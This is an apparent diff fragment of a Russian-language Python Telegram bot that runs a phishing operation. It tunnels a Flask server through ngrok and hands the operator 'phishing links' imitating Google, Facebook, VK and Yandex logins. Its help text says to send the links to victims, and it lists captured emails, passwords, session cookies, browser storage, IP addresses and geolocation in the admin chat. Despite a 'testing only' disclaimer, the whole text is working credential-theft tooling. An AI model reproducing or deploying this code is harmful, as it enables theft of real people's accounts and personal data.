+
+💡 *Что дальше:*
+1. Используйте /links для получения фишинговых ссылок
+2. Отправьте ссылки жертвам
+3. Данные будут приходить автоматически
+4. Все уведомления придут в этот чат
+
+⚠️ *Важно:* Не закрывайте программу!
+Туннель будет активен пока бот работает.
+"""
+            
+            # Сохраняем URL в контексте
+            context.user_data['ngrok_url'] = public_url
+            
+            keyboard = [
+                [InlineKeyboardButton("🔗 Получить ссылки", callback_data="get_links")],
+                [InlineKeyboardButton("🛑 Остановить ngrok", callback_data="stop_ngrok")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await update.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+        else:
+            await update.message.reply_text(
+                "❌ *Не удалось запустить ngrok!*\n\n"
+                "Проверьте:\n"
+                "1. Установлен ли ngrok\n"
+                "2. Верный ли auth token\n"
+                "3. Доступ к интернету\n"
+                "4. Порт 8080 не занят",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    except Exception as e:
+        logger.error(f"Error starting ngrok: {e}")
+        await update.message.reply_text(
+            f"❌ Ошибка запуска ngrok: {str(e)[:100]}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def stop_ngrok_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для остановки ngrok"""
+    try:
+        ngrok_manager.stop_tunnel()
+        
+        if 'ngrok_url' in context.user_data:
+            del context.user_data['ngrok_url']
+        
+        await update.message.reply_text(
+            "🛑 *Ngrok туннель остановлен!*\n\n"
+            "Все фишинговые ссылки теперь неактивны.\n"
+            "Для возобновления работы используйте /start_ngrok",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    except Exception as e:
+        logger.error(f"Error stopping ngrok: {e}")
+        await update.message.reply_text(
+            f"❌ Ошибка остановки ngrok: {str(e)[:100]}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+async def links_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для получения фишинговых ссылок"""
+    ngrok_url = context.user_data.get('ngrok_url')
+    
+    if not ngrok_url:
+        await update.message.reply_text(
+            "❌ *Ngrok туннель не запущен!*\n\n"
+            "Используйте /start_ngrok для запуска туннеля,\n"
+            "затем получите ссылки снова.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    message = MessageFormatter.format_service_links(ngrok_url)
+    
+    keyboard = [
+        [InlineKeyboardButton("Google", url=f"{ngrok_url}/?service=google")],
+        [InlineKeyboardButton("Facebook", url=f"{ngrok_url}/?service=facebook")],
+        [InlineKeyboardButton("ВКонтакте", url=f"{ngrok_url}/?service=vk")],
+        [InlineKeyboardButton("Яндекс", url=f"{ngrok_url}/?service=yandex")],
+        [InlineKeyboardButton("Универсальная", url=ngrok_url)],
+        [InlineKeyboardButton("🔄 Обновить ссылки", callback_data="get_links")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup,
+        disable_web_page_preview=True
+    )
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для просмотра статистики"""
+    message = MessageFormatter.format_stats(db.stats)
+    
+    keyboard = [
+        [InlineKeyboardButton("🔄 Обновить", callback_data="stats")],
+        [InlineKeyboardButton("📋 Список данных", callback_data="list_data")],
+        [InlineKeyboardButton("🔗 Получить ссылки", callback_data="get_links")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        message,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=reply_markup
+    )
+
+async def data_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Команда для просмотра конкретных данных"""
+    if not context.args:
+        await update.message.reply_text(
+            "📊 *Просмотр данных*\n\n"
+            "Используйте: `/data [ID]`\n"
+            "Или: `/data list` - список всех данных\n"
+            "Или: `/data last` - последние данные\n\n"
+            "Пример: `/data abc123def456`\n"
+            "Пример: `/data list`\n"
+            "Пример: `/data last`\n\n"
+            "ID можно получить из уведомлений о захвате данных.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    arg = context.args[0].lower()
+    
+    if arg == "list":
+        # Показываем список всех данных
+        if not db.captured_data:
+            await update.message.reply_text("📭 Нет захваченных данных.")
+            return
+        
+        message = "📋 *ВСЕ ЗАХВАЧЕННЫЕ ДАННЫЕ:*\n\n"
+        
+        # Сортируем по времени (новые сначала)
+        sorted_data = sorted(
+            db.captured_data.values(),
+            key=lambda x: x.timestamp,
+            reverse=True
+        )
+        
+        for i, data in enumerate(sorted_data[:10], 1):
+            services = data.identified_services
+            service_str = ", ".join([
+                ServiceIdentifier.SERVICE_NAMES_RU.get(s, s.title())[:10]
+                for s in (services if services else [])
+            ]) if services else "Не определено"
+            
+            message += f"{i}. *ID:* `{data.id}`\n"
+            message += f"   🕒 {data.timestamp[:16]}\n"
+            message += f"   🌐 {data.source_ip}\n"
+            message += f"   👤 Данных: {len(data.extracted_credentials)}\n"
+            message += f"   🍪 Cookies: {len(data.extracted_cookies)}\n"
+            message += f"   🔍 Сервисы: {service_str}\n"
+            
+            if data.extracted_credentials:
+                email = data.extracted_credentials[0].get('email', 'N/A')
+                message += f"   📧 Email: `{email[:20]}`\n"
+            
+            message += "   ─────\n"
+        
+        if len(sorted_data) > 10:
+            message += f"\n... и еще {len(sorted_data) - 10} записей\n"
+        
+        keyboard = []
+        for data in sorted_data[:5]:
+            keyboard.append([InlineKeyboardButton(
+                f"📊 {data.id[:8]}...",
+                callback_data=f"view_data_{data.id}"
+            )])
+        
+        reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
+        
+        await update.message.reply_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+    
+    elif arg == "last":
+        # Показываем последние данные
+        if not db.captured_data:
+            await update.message.reply_text("📭 Нет захваченных данных.")
+            return
+        
+        # Получаем последнюю запись
+        last_data = max(db.captured_data.values(), key=lambda x: x.timestamp)
+        message = MessageFormatter.format_detailed_data(last_data)
+        
+        await update.message.reply_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+    
+    else:
+        # Показываем данные по конкретному ID
+        data = db.get_captured_data(arg)
+        if not data:
+            await update.message.reply_text(
+                f"❌ Данные с ID `{arg}` не найдены.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            return
+        
+        message = MessageFormatter.format_detailed_data(data)
+        
+        await update.message.reply_text(
+            message,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_web_page_preview=True
+        )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик inline кнопок"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if data == "start_ngrok":
+        await start_ngrok_command(query, context)
+    
+    elif data == "stop_ngrok":
+        await stop_ngrok_command(query, context)
+    
+    elif data == "get_links":
+        await links_command(query, context)
+    
+    elif data == "stats":
+        await stats_command(query, context)
+    
+    elif data == "list_data":
+        await data_command(query, context)
+    
+    elif data.startswith("view_data_"):
+        data_id = data[10:]
+        data_obj = db.get_captured_data(data_id)
+        
+        if data_obj:
+            message = MessageFormatter.format_detailed_data(data_obj)
+            await query.message.reply_text(
+                message,
+                parse_mode=ParseMode.MARKDOWN,
+                disable_web_page_preview=True
+            )
+        else:
+            await query.message.reply_text(
+                f"❌ Данные с ID `{data_id}` не найдены.",
+                parse_mode=ParseMode.MARKDOWN
+            )
+    
+    elif data == "help":
+        help_message = """
+🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*
+
+🎯 *Как использовать систему:*
+1. Запустите ngrok: `/start_ngrok`
+2. Получите фишинговые ссылки: `/links`
+3. Отправьте ссылки жертвам
+4. Получайте данные в реальном времени
+5. Просматривайте статистику: `/stats`
+
+🔐 *Что перехватывается:*
+• Email и пароли из форм входа
+• Cookies сессии браузера
+• Данные из LocalStorage/SessionStorage
+• User Agent и информацию о браузере
+• IP адрес и приблизительную геолокацию
+• Автоматическое определение сервиса
+
+⚡ *Особенности системы:*
+• Работает через ngrok (публичный доступ)
+• Автоматическое определение сервисов
+• Реальное время уведомлений
+• Локальное хранение всех данных
+• Поддержка всех популярных сервисов
+
+🔧 *Основные команды:*
+• /start - Начало работы
+• /start_ngrok - Запуск ngrok туннеля
+• /stop_ngrok - Остановка ngrok
+• /links - Получить фишинговые ссылки
+• /stats - Статистика системы
+• /data [ID] - Просмотр данных
+• /data list - Список всех данных
+• /data last - Последние данные
+
+⚠️ *ВНИМАНИЕ:*
+• Используйте только для тестирования!
+• Все действия логируются
+• Храните токены в безопасности
+• Не нарушайте законодательство
+
+📞 *Поддержка:* @admin
+"""
+        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Обработчик ошибок"""
+    logger.error(f"Update {update} caused error {context.error}", exc_info=True)
+    
+    try:
+        error_msg = str(context.error)
+        if len(error_msg) > 1000:
+            error_msg = error_msg[:1000] + "..."
+        
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"⚠️ *Ошибка в боте:*\n\n{error_msg}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except:
+        pass
+
+def run_flask_server():
+    """Запуск Flask сервера"""
+    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
+
+def main():
+    """Основная функция запуска"""
+    global telegram_app, ngrok_manager, telegram_loop
+    
+    print("🤖 Ngrok Data Collector Bot запускается...")
+    print(f"👑 Админ: {ADMIN_ID}")
+    print("🔧 Инициализация компонентов...")
+    
+    # Инициализация ngrok менеджера
+    ngrok_manager = NgrokManager(NGROK_AUTH_TOKEN)
+    
+    # Создаем приложение Telegram
+    telegram_app = Application.builder().token(BOT_TOKEN).build()
+    
+    # Получаем event loop для использования в Flask
+    telegram_loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(telegram_loop)
+    
+    # Регистрируем обработчики команд
+    telegram_app.add_handler(CommandHandler("start", start_command))
+    telegram_app.add_handler(CommandHandler("start_ngrok", start_ngrok_command))
+    telegram_app.add_handler(CommandHandler("stop_ngrok", stop_ngrok_command))
+    telegram_app.add_handler(CommandHandler("links", links_command))
+    telegram_app.add_handler(CommandHandler("stats", stats_command))
+    telegram_app.add_handler(CommandHandler("data", data_command))
+    
+    # Обработчик inline кнопок
+    telegram_app.add_handler(CallbackQueryHandler(button_handler))
+    
+    # Обработчик ошибок
+    telegram_app.add_error_handler(error_handler)
+    
+    # Запускаем Flask сервер в отдельном потоке
+    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
+    flask_thread.start()
+    
+    print("✅ Flask сервер запущен на порту 8080")
+    print("🤖 Telegram бот запускается...")
+    print("⏳ Ожидание команд...")
+    print("💡 Основные команды:")
+    print("   /start - Начало работы")
+    print("   /start_ngrok - Запуск ngrok туннеля")
+    print("   /links - Получить фишинговые ссылки")
+    print("   /stats - Статистика системы")
+    print("   /data - Просмотр захваченных данных")
+    print("")
+    print("⚠️  ВНИМАНИЕ: Используйте только для тестирования!")
+    print("    Все действия логируются и отслеживаются.")
+    
+    # Запускаем Telegram бота
+    telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)
+
+if __name__ == '__main__':
+    main()
